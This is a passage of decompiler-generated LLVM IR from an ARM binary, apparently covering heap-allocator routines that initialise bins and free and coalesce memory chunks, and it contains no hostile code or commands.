  %v0_14b34 = phi i32 [ %v0_14b34.pre, %dec_label_pc_14aec.dec_label_pc_14b30_crit_edge ], [ %v2_14b2c, %dec_label_pc_14b24 ]
  %v0_14b30 = load i32, i32* %r7.global-to-local, align 4
  %v1_14b30 = add i32 %v0_14b30, 8
  %v2_14b30 = inttoptr i32 %v1_14b30 to i32*
  %v3_14b30 = load i32, i32* %v2_14b30, align 4
  store i32 %v3_14b30, i32* %r2.global-to-local, align 4
  %v1_14b34 = or i32 %v0_14b34, 1
  store i32 %v1_14b34, i32* %r3.global-to-local, align 4
  %v0_14b38 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14b38, i32* %v2_14b30, align 4
  %v0_14b3c = load i32, i32* %r1.global-to-local, align 4
  %v1_14b3c = load i32, i32* %r2.global-to-local, align 4
  %v2_14b3c = add i32 %v1_14b3c, 12
  %v3_14b3c = inttoptr i32 %v2_14b3c to i32*
  store i32 %v0_14b3c, i32* %v3_14b3c, align 4
  %v0_14b40 = load i32, i32* %lr.global-to-local, align 4
  %v1_14b40 = load i32, i32* %r1.global-to-local, align 4
  %v3_14b40 = add i32 %v1_14b40, %v0_14b40
  %v4_14b40 = inttoptr i32 %v3_14b40 to i32*
  store i32 %v0_14b40, i32* %v4_14b40, align 4
  %v0_14b44 = load i32, i32* %r3.global-to-local, align 4
  %v1_14b44 = load i32, i32* %r1.global-to-local, align 4
  %v2_14b44 = add i32 %v1_14b44, 4
  %v3_14b44 = inttoptr i32 %v2_14b44 to i32*
  store i32 %v0_14b44, i32* %v3_14b44, align 4
  %v0_14b48 = load i32, i32* %r2.global-to-local, align 4
  %v1_14b48 = load i32, i32* %r1.global-to-local, align 4
  %v2_14b48 = add i32 %v1_14b48, 8
  %v3_14b48 = inttoptr i32 %v2_14b48 to i32*
  store i32 %v0_14b48, i32* %v3_14b48, align 4
  %v0_14b4c = load i32, i32* %r7.global-to-local, align 4
  %v1_14b4c = load i32, i32* %r1.global-to-local, align 4
  %v2_14b4c = add i32 %v1_14b4c, 12
  %v3_14b4c = inttoptr i32 %v2_14b4c to i32*
  store i32 %v0_14b4c, i32* %v3_14b4c, align 4
  br label %dec_label_pc_14b64

dec_label_pc_14b54:                               ; preds = %dec_label_pc_14adc
  %v2_14b54 = add i32 %v1_14ae4, %v0_14b54
  %v1_14b58 = or i32 %v2_14b54, 1
  store i32 %v1_14b58, i32* %r3.global-to-local, align 4
  %v1_14b5c = load i32, i32* %r1.global-to-local, align 4
  %v2_14b5c = add i32 %v1_14b5c, 4
  %v3_14b5c = inttoptr i32 %v2_14b5c to i32*
  store i32 %v1_14b58, i32* %v3_14b5c, align 4
  %v0_14b60 = load i32, i32* %r1.global-to-local, align 4
  %v1_14b60 = load i32, i32* @r4, align 4
  %v2_14b60 = add i32 %v1_14b60, 44
  %v3_14b60 = inttoptr i32 %v2_14b60 to i32*
  store i32 %v0_14b60, i32* %v3_14b60, align 4
  br label %dec_label_pc_14b64

dec_label_pc_14b64:                               ; preds = %dec_label_pc_14b30, %dec_label_pc_14b54
  %v0_14b64 = load i32, i32* %sl.global-to-local, align 4
  %v2_14b64 = icmp eq i32 %v0_14b64, 0
  store i32 %v0_14b64, i32* %r1.global-to-local, align 4
  br i1 %v2_14b64, label %dec_label_pc_14b70.loopexit, label %dec_label_pc_14a8c

dec_label_pc_14b70.loopexit:                      ; preds = %dec_label_pc_14b64
  %v0_14b70.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_14b70.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_14b70

dec_label_pc_14b70:                               ; preds = %dec_label_pc_14b70.loopexit, %dec_label_pc_14a7c
  %v1_14b70 = phi i32 [ %v1_14b70.pre, %dec_label_pc_14b70.loopexit ], [ %v1_14b7010, %dec_label_pc_14a7c ]
  %v0_14b78 = phi i32 [ %v0_14b70.pre, %dec_label_pc_14b70.loopexit ], [ %v1_14a88, %dec_label_pc_14a7c ]
  %v9_14b70 = icmp eq i32 %v0_14b78, %v1_14b70
  br i1 %v9_14b70, label %dec_label_pc_14be8, label %dec_label_pc_14b78

dec_label_pc_14b78:                               ; preds = %dec_label_pc_14b70
  %v1_14b78 = add i32 %v0_14b78, 4
  store i32 %v1_14b78, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_14b80.dec_label_pc_14b80_crit_edge:  ; preds = %dec_label_pc_14b80.preheader, %dec_label_pc_14b80.dec_label_pc_14b80_crit_edge
  %v0_14b80.pre = load i32, i32* @r4, align 4
  %v1_14b80.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_14b80 = mul i32 %v1_14b80.pre, 8
  %v5_14b80 = add i32 %v4_14b80, %v0_14b80.pre
  %v1_14b84 = add i32 %v1_14b80.pre, 1
  store i32 %v1_14b84, i32* %r2.global-to-local, align 4
  %v1_14b88 = add i32 %v5_14b80, 44
  store i32 %v1_14b88, i32* %r3.global-to-local, align 4
  %v2_14b90 = add i32 %v5_14b80, 52
  %v3_14b90 = inttoptr i32 %v2_14b90 to i32*
  store i32 %v1_14b88, i32* %v3_14b90, align 4
  %v0_14b94 = load i32, i32* %r3.global-to-local, align 4
  %v2_14b94 = add i32 %v0_14b94, 12
  %v3_14b94 = inttoptr i32 %v2_14b94 to i32*
  store i32 %v0_14b94, i32* %v3_14b94, align 4
  %v7_14b98 = icmp sgt i32 %v1_14b84, 95
  br i1 %v7_14b98, label %dec_label_pc_14b9c, label %dec_label_pc_14b80.dec_label_pc_14b80_crit_edge

dec_label_pc_14b9c:                               ; preds = %dec_label_pc_14b80.dec_label_pc_14b80_crit_edge
  %v0_14b9c = load i32, i32* @r4, align 4
  %v1_14b9c = inttoptr i32 %v0_14b9c to i32*
  %v2_14b9c = load i32, i32* %v1_14b9c, align 4
  store i32 %v2_14b9c, i32* %r2.global-to-local, align 4
  %v1_14ba0 = add i32 %v0_14b9c, 864
  %v2_14ba0 = inttoptr i32 %v1_14ba0 to i32*
  %v3_14ba0 = load i32, i32* %v2_14ba0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14ba8 = urem i32 %v2_14b9c, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_14bb0 = or i32 %v3_14ba0, 1
  store i32 %v1_14bb0, i32* %r1.global-to-local, align 4
  %v1_14bb4 = or i32 %v1_14ba8, 72
  store i32 %v1_14bb4, i32* %r2.global-to-local, align 4
  %v1_14bb8 = add i32 %v0_14b9c, 52
  store i32 %v1_14bb8, i32* @ip, align 4
  %v2_14bbc = add i32 %v0_14b9c, 840
  %v3_14bbc = inttoptr i32 %v2_14bbc to i32*
  store i32 0, i32* %v3_14bbc, align 4
  %v0_14bc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_14bc0 = add i32 %v0_14bc0, 65536
  store i32 %v1_14bc0, i32* %r3.global-to-local, align 4
  %v0_14bc4 = load i32, i32* %r0.global-to-local, align 4
  %v1_14bc4 = load i32, i32* @r4, align 4
  %v2_14bc4 = add i32 %v1_14bc4, 836
  %v3_14bc4 = inttoptr i32 %v2_14bc4 to i32*
  store i32 %v0_14bc4, i32* %v3_14bc4, align 4
  %v0_14bc8 = load i32, i32* %r0.global-to-local, align 4
  %v1_14bc8 = load i32, i32* @r4, align 4
  %v2_14bc8 = add i32 %v1_14bc8, 844
  %v3_14bc8 = inttoptr i32 %v2_14bc8 to i32*
  store i32 %v0_14bc8, i32* %v3_14bc8, align 4
  %v1_14bcc = load i32, i32* @r4, align 4
  %v2_14bcc = add i32 %v1_14bcc, 852
  %v3_14bcc = inttoptr i32 %v2_14bcc to i32*
  store i32 %v1_14bc0, i32* %v3_14bcc, align 4
  %v1_14bd0 = load i32, i32* @r4, align 4
  %v2_14bd0 = add i32 %v1_14bd0, 864
  %v3_14bd0 = inttoptr i32 %v2_14bd0 to i32*
  store i32 %v1_14bb0, i32* %v3_14bd0, align 4
  %v1_14bd4 = load i32, i32* @r4, align 4
  %v2_14bd4 = inttoptr i32 %v1_14bd4 to i32*
  store i32 %v1_14bb4, i32* %v2_14bd4, align 4
  %v0_14bd8 = load i32, i32* @ip, align 4
  %v1_14bd8 = load i32, i32* @r4, align 4
  %v2_14bd8 = add i32 %v1_14bd8, 44
  %v3_14bd8 = inttoptr i32 %v2_14bd8 to i32*
  store i32 %v0_14bd8, i32* %v3_14bd8, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_14be0 = call i32 @function_15444(i32 30, i32 %v1_14bb0, i32 %v1_14bb4, i32 %v1_14bc0)
  store i32 %v4_14be0, i32* @r0, align 4
  %v1_14be4 = load i32, i32* @r4, align 4
  %v2_14be4 = add i32 %v1_14be4, 860
  %v3_14be4 = inttoptr i32 %v2_14be4 to i32*
  store i32 %v4_14be0, i32* %v3_14be4, align 4
  br label %dec_label_pc_14be8

dec_label_pc_14be8:                               ; preds = %dec_label_pc_14b70, %dec_label_pc_14b9c
  %v2_14bec = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14bec, i32* @r4, align 4
  %v1_14bf0 = load i32, i32* @r0, align 4
  ret i32 %v1_14bf0

; uselistorder directives
  uselistorder i32 %v0_14b9c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14b94, { 1, 0 }
  uselistorder i32 %v1_14b78, { 1, 0 }
  uselistorder i32 %v0_14b64, { 0, 2, 1 }
  uselistorder i32 %v0_14b40, { 1, 0 }
  uselistorder i32 %v1_14a90, { 1, 0, 2 }
  uselistorder i32 %v0_14aa8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_14a68, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 17 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 12, 0, 10, 11, 6, 2, 3, 7, 4, 8, 5, 9, 13 }
  uselistorder label %dec_label_pc_14be8, { 1, 0 }
  uselistorder label %dec_label_pc_14b80.dec_label_pc_14b80_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14b64, { 1, 0 }
  uselistorder label %dec_label_pc_14b30, { 1, 0 }
  uselistorder label %dec_label_pc_14b24, { 1, 0 }
  uselistorder label %dec_label_pc_14b20, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14adc, { 1, 0 }
}

define i32 @function_14bf4() local_unnamed_addr {
dec_label_pc_14bf4:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_14bf4 = load i32, i32* @r4, align 4
  %v6_14bf4 = load i32, i32* @r5, align 4
  %v9_14bf4 = load i32, i32* @r6, align 4
  %v12_14bf4 = load i32, i32* @r7, align 4
  %v18_14bf4 = load i32, i32* @lr, align 4
  %v0_14bfc = load i32, i32* @r0, align 4
  store i32 %v0_14bfc, i32* @r6, align 4
  %v2_14bfc = icmp eq i32 %v0_14bfc, 0
  %v2_14c00 = ptrtoint i32* %stack_var_-40 to i32
  store i32 135344, i32* @r7, align 4
  br i1 %v2_14bfc, label %dec_label_pc_14e08, label %dec_label_pc_14c0c

dec_label_pc_14c0c:                               ; preds = %dec_label_pc_14bf4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_14c10 = load i32, i32* inttoptr (i32 135412 to i32*), align 4
  store i32 %v4_14c10, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_14c10, i32* %r2.global-to-local, align 4
  %v4_14c1c = load i32, i32* inttoptr (i32 135380 to i32*), align 4
  store i32 %v4_14c1c, i32* %r1.global-to-local, align 4
  store i32 %v2_14c00, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_14c28 = load i32, i32* inttoptr (i32 135416 to i32*), align 8
  store i32 %v4_14c28, i32* %ip.global-to-local, align 4
  store i32 85044, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14c28)
  %v0_14c34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14c34, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_14c3c = load i32, i32* @r7, align 4
  %v2_14c3c = add i32 %v0_14c3c, 16
  %v3_14c3c = inttoptr i32 %v2_14c3c to i32*
  %v4_14c3c = load i32, i32* %v3_14c3c, align 4
  store i32 %v4_14c3c, i32* %ip.global-to-local, align 4
  store i32 85064, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14c3c)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_14c4c = load i32, i32* @r7, align 4
  %v2_14c4c = add i32 %v0_14c4c, 32
  %v3_14c4c = inttoptr i32 %v2_14c4c to i32*
  %v4_14c4c = load i32, i32* %v3_14c4c, align 4
  store i32 %v4_14c4c, i32* @lr, align 4
  %v0_14c50 = load i32, i32* @r6, align 4
  %v1_14c50 = add i32 %v0_14c50, -4
  %v2_14c50 = inttoptr i32 %v1_14c50 to i32*
  %v3_14c50 = load i32, i32* %v2_14c50, align 4
  store i32 %v3_14c50, i32* %r2.global-to-local, align 4
  %v1_14c54 = inttoptr i32 %v4_14c4c to i32*
  %v2_14c54 = load i32, i32* %v1_14c54, align 4
  store i32 %v2_14c54, i32* %r3.global-to-local, align 4
  %v1_14c58 = and i32 %v3_14c50, -4
  store i32 %v1_14c58, i32* %ip.global-to-local, align 4
  %v1_14c5c = add i32 %v0_14c50, -8
  store i32 %v1_14c5c, i32* @r5, align 4
  store i32 %v1_14c5c, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_14c58, %v2_14c54
  br i1 %tmp, label %dec_label_pc_14c8c, label %dec_label_pc_14c6c

dec_label_pc_14c6c:                               ; preds = %dec_label_pc_14c0c
  %v1_14c6c = or i32 %v2_14c54, 3
  store i32 %v1_14c6c, i32* %r3.global-to-local, align 4
  store i32 %v1_14c6c, i32* %v1_14c54, align 4
  %v3_14c70 = load i32, i32* @lr, align 4
  %v4_14c70 = add i32 %v3_14c70, -8
  store i32 %v4_14c70, i32* %lr.global-to-local, align 4
  %v0_14c74 = load i32, i32* %ip.global-to-local, align 4
  %v3_14c74 = udiv i32 %v0_14c74, 8
  store i32 %v3_14c74, i32* %r1.global-to-local, align 4
  %v1_14c78 = add i32 %v3_14c70, -4
  store i32 %v1_14c78, i32* %r2.global-to-local, align 4
  %v4_14c7c = mul nuw i32 %v3_14c74, 4
  %v5_14c7c = add i32 %v4_14c7c, %v1_14c78
  %v6_14c7c = inttoptr i32 %v5_14c7c to i32*
  %v7_14c7c = load i32, i32* %v6_14c7c, align 4
  store i32 %v7_14c7c, i32* %r3.global-to-local, align 4
  %v1_14c80 = load i32, i32* @r5, align 4
  %v2_14c80 = add i32 %v1_14c80, 8
  %v3_14c80 = inttoptr i32 %v2_14c80 to i32*
  store i32 %v7_14c7c, i32* %v3_14c80, align 4
  %v0_14c84 = load i32, i32* @r5, align 4
  %v1_14c84 = load i32, i32* %r2.global-to-local, align 4
  %v2_14c84 = load i32, i32* %r1.global-to-local, align 4
  %v5_14c84 = mul i32 %v2_14c84, 4
  %v6_14c84 = add i32 %v5_14c84, %v1_14c84
  %v7_14c84 = inttoptr i32 %v6_14c84 to i32*
  store i32 %v0_14c84, i32* %v7_14c84, align 4
  br label %dec_label_pc_14df0

dec_label_pc_14c8c:                               ; preds = %dec_label_pc_14c0c
  %v1_14c8c = and i32 %v3_14c50, 2
  %v2_14c8c = icmp eq i32 %v1_14c8c, 0
  br i1 %v2_14c8c, label %dec_label_pc_14c94, label %dec_label_pc_14dc8

dec_label_pc_14c94:                               ; preds = %dec_label_pc_14c8c
  %v1_14c94 = or i32 %v2_14c54, 1
  store i32 %v1_14c94, i32* %r3.global-to-local, align 4
  store i32 %v1_14c94, i32* %v1_14c54, align 4
  %v0_14c9c = load i32, i32* @r6, align 4
  %v1_14c9c = add i32 %v0_14c9c, -4
  %v2_14c9c = inttoptr i32 %v1_14c9c to i32*
  %v3_14c9c = load i32, i32* %v2_14c9c, align 4
  store i32 %v3_14c9c, i32* %r3.global-to-local, align 4
  %v0_14ca0 = load i32, i32* @r5, align 4
  %v1_14ca0 = load i32, i32* %ip.global-to-local, align 4
  %v2_14ca0 = add i32 %v1_14ca0, %v0_14ca0
  store i32 %v2_14ca0, i32* %lr.global-to-local, align 4
  %v1_14ca4 = urem i32 %v3_14c9c, 2
  %v2_14ca4 = icmp eq i32 %v1_14ca4, 0
  %v1_14ca8 = add i32 %v2_14ca0, 4
  %v2_14ca8 = inttoptr i32 %v1_14ca8 to i32*
  %v3_14ca8 = load i32, i32* %v2_14ca8, align 4
  store i32 %v3_14ca8, i32* %r8.global-to-local, align 4
  br i1 %v2_14ca4, label %dec_label_pc_14cb0, label %dec_label_pc_14ce4

dec_label_pc_14cb0:                               ; preds = %dec_label_pc_14c94
  %v1_14cb0 = add i32 %v0_14c9c, -8
  %v2_14cb0 = inttoptr i32 %v1_14cb0 to i32*
  %v3_14cb0 = load i32, i32* %v2_14cb0, align 4
  store i32 %v3_14cb0, i32* %r1.global-to-local, align 4
  %v2_14cb4 = sub i32 %v0_14ca0, %v3_14cb0
  store i32 %v2_14cb4, i32* %r3.global-to-local, align 4
  %v1_14cb8 = add i32 %v2_14cb4, 8
  %v2_14cb8 = inttoptr i32 %v1_14cb8 to i32*
  %v3_14cb8 = load i32, i32* %v2_14cb8, align 4
  store i32 %v3_14cb8, i32* %r2.global-to-local, align 4
  %v1_14cbc = add i32 %v3_14cb8, 12
  %v2_14cbc = inttoptr i32 %v1_14cbc to i32*
  %v3_14cbc = load i32, i32* %v2_14cbc, align 4
  store i32 %v3_14cbc, i32* %r4.global-to-local, align 4
  %v9_14cc0 = icmp eq i32 %v3_14cbc, %v2_14cb4
  %v1_14cc4 = add i32 %v2_14cb4, 12
  %v2_14cc4 = inttoptr i32 %v1_14cc4 to i32*
  %v3_14cc4 = load i32, i32* %v2_14cc4, align 4
  store i32 %v3_14cc4, i32* %r0.global-to-local, align 4
  br i1 %v9_14cc0, label %dec_label_pc_14ccc, label %dec_label_pc_14d30

dec_label_pc_14ccc:                               ; preds = %dec_label_pc_14cb0
  %v1_14ccc = add i32 %v3_14cc4, 8
  %v2_14ccc = inttoptr i32 %v1_14ccc to i32*
  %v3_14ccc = load i32, i32* %v2_14ccc, align 4
  store i32 %v3_14ccc, i32* %r3.global-to-local, align 4
  %v9_14cd0 = icmp eq i32 %v3_14ccc, %v2_14cb4
  br i1 %v9_14cd0, label %dec_label_pc_14cd8, label %dec_label_pc_14d30

dec_label_pc_14cd8:                               ; preds = %dec_label_pc_14ccc
  store i32 %v3_14cb8, i32* %v2_14ccc, align 4
  %v0_14cdc = load i32, i32* %r0.global-to-local, align 4
  %v1_14cdc = load i32, i32* %r2.global-to-local, align 4
  %v2_14cdc = add i32 %v1_14cdc, 12
  %v3_14cdc = inttoptr i32 %v2_14cdc to i32*
  store i32 %v0_14cdc, i32* %v3_14cdc, align 4
  %v0_14ce0 = load i32, i32* %ip.global-to-local, align 4
  %v1_14ce0 = load i32, i32* %r1.global-to-local, align 4
  %v2_14ce0 = add i32 %v1_14ce0, %v0_14ce0
  store i32 %v2_14ce0, i32* %ip.global-to-local, align 4
  %v0_14cf0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_14cf4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14ce4

dec_label_pc_14ce4:                               ; preds = %dec_label_pc_14c94, %dec_label_pc_14cd8
  %v0_14d70 = phi i32 [ %v1_14ca0, %dec_label_pc_14c94 ], [ %v2_14ce0, %dec_label_pc_14cd8 ]
  %v0_14cf4 = phi i32 [ %v3_14ca8, %dec_label_pc_14c94 ], [ %v0_14cf4.pre, %dec_label_pc_14cd8 ]
  %v1_14d08 = phi i32 [ %v2_14ca0, %dec_label_pc_14c94 ], [ %v0_14cf0.pre, %dec_label_pc_14cd8 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_14ce8 = load i32, i32* @r7, align 4
  %v2_14ce8 = add i32 %v0_14ce8, 32
  %v3_14ce8 = inttoptr i32 %v2_14ce8 to i32*
  %v4_14ce8 = load i32, i32* %v3_14ce8, align 4
  store i32 %v4_14ce8, i32* %r2.global-to-local, align 4
  %v1_14cec = add i32 %v4_14ce8, 44
  %v2_14cec = inttoptr i32 %v1_14cec to i32*
  %v3_14cec = load i32, i32* %v2_14cec, align 4
  store i32 %v3_14cec, i32* %r3.global-to-local, align 4
  %v9_14cf0 = icmp eq i32 %v1_14d08, %v3_14cec
  %v1_14cf4 = and i32 %v0_14cf4, -4
  store i32 %v1_14cf4, i32* %r0.global-to-local, align 4
  br i1 %v9_14cf0, label %dec_label_pc_14d70, label %dec_label_pc_14cfc

dec_label_pc_14cfc:                               ; preds = %dec_label_pc_14ce4
  %v2_14cfc = add i32 %v1_14d08, %v1_14cf4
  store i32 %v2_14cfc, i32* %r3.global-to-local, align 4
  %v1_14d00 = add i32 %v2_14cfc, 4
  %v2_14d00 = inttoptr i32 %v1_14d00 to i32*
  %v3_14d00 = load i32, i32* %v2_14d00, align 4
  store i32 %v3_14d00, i32* %r3.global-to-local, align 4
  %v1_14d04 = urem i32 %v3_14d00, 2
  %v2_14d04 = icmp eq i32 %v1_14d04, 0
  %v2_14d08 = add i32 %v1_14d08, 4
  %v3_14d08 = inttoptr i32 %v2_14d08 to i32*
  store i32 %v1_14cf4, i32* %v3_14d08, align 4
  br i1 %v2_14d04, label %dec_label_pc_14d10, label %dec_label_pc_14cfc.dec_label_pc_14d40_crit_edge

dec_label_pc_14cfc.dec_label_pc_14d40_crit_edge:  ; preds = %dec_label_pc_14cfc
  %v0_14d50.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14d40

dec_label_pc_14d10:                               ; preds = %dec_label_pc_14cfc
  %v0_14d10 = load i32, i32* %lr.global-to-local, align 4
  %v1_14d10 = add i32 %v0_14d10, 8
  %v2_14d10 = inttoptr i32 %v1_14d10 to i32*
  %v3_14d10 = load i32, i32* %v2_14d10, align 4
  store i32 %v3_14d10, i32* %r1.global-to-local, align 4
  %v1_14d14 = add i32 %v3_14d10, 12
  %v2_14d14 = inttoptr i32 %v1_14d14 to i32*
  %v3_14d14 = load i32, i32* %v2_14d14, align 4
  store i32 %v3_14d14, i32* %r3.global-to-local, align 4
  %v9_14d18 = icmp eq i32 %v3_14d14, %v0_14d10
  %v1_14d1c = add i32 %v0_14d10, 12
  %v2_14d1c = inttoptr i32 %v1_14d1c to i32*
  %v3_14d1c = load i32, i32* %v2_14d1c, align 4
  store i32 %v3_14d1c, i32* %r2.global-to-local, align 4
  br i1 %v9_14d18, label %dec_label_pc_14d24, label %dec_label_pc_14d30

dec_label_pc_14d24:                               ; preds = %dec_label_pc_14d10
  %v1_14d24 = add i32 %v3_14d1c, 8
  %v2_14d24 = inttoptr i32 %v1_14d24 to i32*
  %v3_14d24 = load i32, i32* %v2_14d24, align 4
  store i32 %v3_14d24, i32* %r3.global-to-local, align 4
  %v9_14d28 = icmp eq i32 %v3_14d24, %v0_14d10
  br i1 %v9_14d28, label %dec_label_pc_14d34, label %dec_label_pc_14d30

dec_label_pc_14d30:                               ; preds = %dec_label_pc_14d10, %dec_label_pc_14ccc, %dec_label_pc_14cb0, %dec_label_pc_14d24
  %v0_14d30 = call i32 @function_14e70()
  store i32 %v0_14d30, i32* %r0.global-to-local, align 4
  %v0_14d34.pre = load i32, i32* @r1, align 4
  %v1_14d34.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14d34

dec_label_pc_14d34:                               ; preds = %dec_label_pc_14d24, %dec_label_pc_14d30
  %v1_14d34 = phi i32 [ %v3_14d1c, %dec_label_pc_14d24 ], [ %v1_14d34.pre, %dec_label_pc_14d30 ]
  %v0_14d34 = phi i32 [ %v3_14d10, %dec_label_pc_14d24 ], [ %v0_14d34.pre, %dec_label_pc_14d30 ]
  %v2_14d34 = add i32 %v1_14d34, 8
  %v3_14d34 = inttoptr i32 %v2_14d34 to i32*
  store i32 %v0_14d34, i32* %v3_14d34, align 4
  %v0_14d38 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d38 = load i32, i32* %r1.global-to-local, align 4
  %v2_14d38 = add i32 %v1_14d38, 12
  %v3_14d38 = inttoptr i32 %v2_14d38 to i32*
  store i32 %v0_14d38, i32* %v3_14d38, align 4
  %v0_14d3c = load i32, i32* %ip.global-to-local, align 4
  %v1_14d3c = load i32, i32* %r0.global-to-local, align 4
  %v2_14d3c = add i32 %v1_14d3c, %v0_14d3c
  store i32 %v2_14d3c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14d40

dec_label_pc_14d40:                               ; preds = %dec_label_pc_14cfc.dec_label_pc_14d40_crit_edge, %dec_label_pc_14d34
  %v0_14d50 = phi i32 [ %v0_14d50.pre, %dec_label_pc_14cfc.dec_label_pc_14d40_crit_edge ], [ %v2_14d3c, %dec_label_pc_14d34 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_14d44 = load i32, i32* @r7, align 4
  %v2_14d44 = add i32 %v0_14d44, 32
  %v3_14d44 = inttoptr i32 %v2_14d44 to i32*
  %v4_14d44 = load i32, i32* %v3_14d44, align 4
  %v1_14d48 = add i32 %v4_14d44, 52
  store i32 %v1_14d48, i32* %r3.global-to-local, align 4
  %v1_14d4c = add i32 %v4_14d44, 60
  %v2_14d4c = inttoptr i32 %v1_14d4c to i32*
  %v3_14d4c = load i32, i32* %v2_14d4c, align 4
  store i32 %v3_14d4c, i32* %r1.global-to-local, align 4
  %v1_14d50 = or i32 %v0_14d50, 1
  store i32 %v1_14d50, i32* %r2.global-to-local, align 4
  %v1_14d54 = load i32, i32* %r4.global-to-local, align 4
  %v2_14d54 = add i32 %v1_14d54, 12
  %v3_14d54 = inttoptr i32 %v2_14d54 to i32*
  store i32 %v1_14d48, i32* %v3_14d54, align 4
  %v0_14d58 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d58 = load i32, i32* %r4.global-to-local, align 4
  %v2_14d58 = add i32 %v1_14d58, 8
  %v3_14d58 = inttoptr i32 %v2_14d58 to i32*
  store i32 %v0_14d58, i32* %v3_14d58, align 4
  %v0_14d5c = load i32, i32* %r2.global-to-local, align 4
  %v1_14d5c = load i32, i32* %r4.global-to-local, align 4
  %v2_14d5c = add i32 %v1_14d5c, 4
  %v3_14d5c = inttoptr i32 %v2_14d5c to i32*
  store i32 %v0_14d5c, i32* %v3_14d5c, align 4
  %v0_14d60 = load i32, i32* %ip.global-to-local, align 4
  %v1_14d60 = load i32, i32* %r4.global-to-local, align 4
  %v3_14d60 = add i32 %v1_14d60, %v0_14d60
  %v4_14d60 = inttoptr i32 %v3_14d60 to i32*
  store i32 %v0_14d60, i32* %v4_14d60, align 4
  %v0_14d64 = load i32, i32* %r4.global-to-local, align 4
  %v1_14d64 = load i32, i32* %r1.global-to-local, align 4
  %v2_14d64 = add i32 %v1_14d64, 12
  %v3_14d64 = inttoptr i32 %v2_14d64 to i32*
  store i32 %v0_14d64, i32* %v3_14d64, align 4
  %v0_14d68 = load i32, i32* %r4.global-to-local, align 4
  %v1_14d68 = load i32, i32* %r3.global-to-local, align 4
  %v2_14d68 = add i32 %v1_14d68, 8
  %v3_14d68 = inttoptr i32 %v2_14d68 to i32*
  store i32 %v0_14d68, i32* %v3_14d68, align 4
  br label %dec_label_pc_14d80

dec_label_pc_14d70:                               ; preds = %dec_label_pc_14ce4
  %v2_14d70 = add i32 %v1_14cf4, %v0_14d70
  store i32 %v2_14d70, i32* %ip.global-to-local, align 4
  %v1_14d74 = or i32 %v2_14d70, 1
  store i32 %v1_14d74, i32* %r3.global-to-local, align 4
  %v0_14d78 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14d78, i32* %v2_14cec, align 4
  %v0_14d7c = load i32, i32* %r3.global-to-local, align 4
  %v1_14d7c = load i32, i32* %r4.global-to-local, align 4
  %v2_14d7c = add i32 %v1_14d7c, 4
  %v3_14d7c = inttoptr i32 %v2_14d7c to i32*
  store i32 %v0_14d7c, i32* %v3_14d7c, align 4
  br label %dec_label_pc_14d80

dec_label_pc_14d80:                               ; preds = %dec_label_pc_14d40, %dec_label_pc_14d70
  %v0_14d80 = load i32, i32* %ip.global-to-local, align 4
  %v3_14d84 = icmp ult i32 %v0_14d80, 131070
  br i1 %v3_14d84, label %dec_label_pc_14df0, label %dec_label_pc_14d88

dec_label_pc_14d88:                               ; preds = %dec_label_pc_14d80
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_14d8c = load i32, i32* @r7, align 4
  %v2_14d8c = add i32 %v0_14d8c, 32
  %v3_14d8c = inttoptr i32 %v2_14d8c to i32*
  %v4_14d8c = load i32, i32* %v3_14d8c, align 4
  store i32 %v4_14d8c, i32* @r4, align 4
  %v1_14d90 = inttoptr i32 %v4_14d8c to i32*
  %v2_14d90 = load i32, i32* %v1_14d90, align 4
  store i32 %v2_14d90, i32* %r3.global-to-local, align 4
  %v1_14d94 = and i32 %v2_14d90, 2
  %v2_14d94 = icmp eq i32 %v1_14d94, 0
